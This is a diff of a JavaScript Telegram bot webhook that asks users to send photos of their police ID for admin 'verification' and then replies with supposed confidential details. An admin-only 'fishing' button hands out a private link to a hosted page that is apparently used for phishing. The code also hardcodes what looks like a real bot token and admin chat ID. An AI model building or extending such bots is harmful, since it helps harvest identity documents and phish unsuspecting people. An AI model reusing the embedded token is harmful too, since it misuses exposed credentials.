@@ -2,11 +2,11 @@ const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
 const ADMIN_CHAT_ID = '7216371031';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// In-memory map to track police requests
+// In-memory tracker
 const policeRequests = new Map();
 
 export default async function handler(req, res) {
-  console.log('📩 Telegram Update:', JSON.stringify(req.body, null, 2));
+  console.log('📩 Telegram Webhook Received:', JSON.stringify(req.body, null, 2));
 
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method Not Allowed' });
@@ -20,19 +20,19 @@ export default async function handler(req, res) {
   const photo = body.message?.photo;
 
   try {
+    // 🟡 Start command
     if (text === '/start') {
       await sendWelcomeWithButtons(chatId);
     }
 
-    // 🖼️ Police sends photo ID
-    if (photo && chatId !== ADMIN_CHAT_ID) {
-      const fileId = photo[photo.length - 1].file_id; // Get highest resolution
-      const caption = `📸 *Police ID Submitted*\nFrom: [User ID: ${chatId}]`;
+    // 🟢 Handle photo (police ID)
+    if (photo && chatId.toString() !== ADMIN_CHAT_ID) {
+      const fileId = photo[photo.length - 1].file_id;
 
-      // Track police request
       policeRequests.set(chatId, { verified: false });
 
-      // Forward to admin with "Verify" button
+      const caption = `📸 *Police ID Submitted*\nFrom: [User ID: ${chatId}]`;
+
       await fetch(`${TELEGRAM_API_URL}/sendPhoto`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -51,17 +51,17 @@ export default async function handler(req, res) {
               ]
             ]
           }
-        }),
+        })
       });
 
-      await sendMessage(chatId, `🕵️‍♂️ Your Police ID has been submitted.\nPlease wait for admin verification.`);
+      await sendMessage(chatId, `🕵️‍♂️ Your Police ID has been submitted.\nPlease wait while our admin reviews it.`);
     }
 
-    // 🧠 Callback Handling
+    // 🔁 Handle button callbacks
     if (callbackQuery) {
       const data = callbackQuery.data;
-      const fromChatId = message.chat.id;
-      const isAdmin = fromChatId.toString() === ADMIN_CHAT_ID;
+      const fromChatId = message.chat.id.toString();
+      const isAdmin = fromChatId === ADMIN_CHAT_ID;
 
       if (data === 'details') {
         const adminMessage = isAdmin
@@ -71,25 +71,23 @@ export default async function handler(req, res) {
       }
 
       else if (data === 'fishing') {
-        const msg = isAdmin
+        const fishingMessage = isAdmin
           ? `🎣 *Fishing Link \\(Private\\)*\n🔗 ||https://heavenscake\\.vercel\\.app/page\\.html||`
-          : `🚫 *This feature is for admins only`;
-        await sendMessage(fromChatId, msg);
+          : `🚫 *This feature is not for you\\.*\nAccess is restricted.`;
+        await sendMessage(fromChatId, fishingMessage);
       }
 
       else if (data === 'police') {
         await sendMessage(fromChatId,
-          `🛂 *Police Verification Required*\n\n📸 Please send a clear photo of your *Police ID*\.\nOur admin will review and verify you before providing access to restricted info.`);
+          `🛂 *Police Verification Required*\n\n📸 Please send a clear photo of your *Police ID*\\.\nOur admin will verify and give you confidential access.`);
       }
 
       else if (data.startsWith('verify_') && isAdmin) {
         const targetChatId = data.split('_')[1];
 
-        // Send confirmation to police
         await sendMessage(targetChatId,
-          `✅ *You have been verified!*\n\nHere are your confidential details:\n\n👤 *Admin Name:* Muhammed Rishad\n🎂 *DOB:* 01\\/01\\/1990\n📞 *Phone:* +91 98765 43210\n📧 *Email:* secret\\@r1shaad\\.com\n🤖 *Bot Scripts:* Access granted\n🔐 *API Key:* demo\\_token\\_123456\n🧰 *Tools:* Hidden admin panel activated`);
+          `✅ *You have been verified as a police officer\\!*\n\nHere are the confidential details:\n\n👤 *Admin Name:* Muhammed Rishad\n🎂 *DOB:* 01\\/01\\/1990\n📞 *Phone:* +91 98765 43210\n📧 *Email:* secret\\@r1shaad\\.com\n🤖 *Bot Scripts:* Access granted\n🔐 *API Token:* demo\\_token\\_123456\n🧰 *Tools:* Hidden admin panel activated`);
 
-        // Optional: reply to admin
         await sendMessage(ADMIN_CHAT_ID, `✅ Police verified: ${targetChatId}`);
       }
 
@@ -103,7 +101,7 @@ export default async function handler(req, res) {
   }
 }
 
-// 🔘 Welcome message
+// 🎛️ Start command buttons
 async function sendWelcomeWithButtons(chatId) {
   const payload = {
     chat_id: chatId,
@@ -135,7 +133,7 @@ async function sendWelcomeWithButtons(chatId) {
   });
 }
 
-// 📨 MarkdownV2-safe message sender
+// ✉️ Send a message
 async function sendMessage(chatId, message) {
   return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
     method: 'POST',
@@ -148,7 +146,7 @@ async function sendMessage(chatId, message) {
   });
 }
 
-// ✅ Handle callback loading spinner
+// ✅ Remove callback loading spinner
 async function answerCallback(callbackQueryId) {
   return fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
     method: 'POST',
